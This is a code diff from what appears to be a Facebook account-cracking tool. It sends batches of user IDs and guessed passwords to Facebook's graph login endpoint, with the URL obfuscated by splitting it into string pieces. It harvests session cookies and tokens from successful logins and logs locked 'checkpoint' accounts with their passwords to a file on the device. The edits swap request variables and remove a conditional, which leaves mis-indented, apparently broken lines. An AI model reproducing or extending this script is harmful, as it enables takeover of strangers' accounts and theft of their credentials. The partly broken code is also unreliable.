@@ -886,7 +886,7 @@ def m7(ids,pwv):
             'X-FB-Server-Cluster':'True',
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
             url = 'htt'+'ps://g'+'raph.face'+'book.com/auth/login'
-            q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                 coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                 cid = str(q['uid'])
@@ -963,7 +963,7 @@ def m8(ids,pwv):
             'X-FB-Server-Cluster':'True',
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
             url = 'htt'+'ps://g'+'raph.face'+'book.com/auth/login'
-            q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                 coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                 cid = str(q['uid'])
@@ -978,7 +978,6 @@ def m8(ids,pwv):
                         oks.append(cid)
                         break
             elif 'www.facebook.com' in q['error']['message']:
-                if 'y' in cp_xdx:
                         print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                         open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                         cps.append(uid)
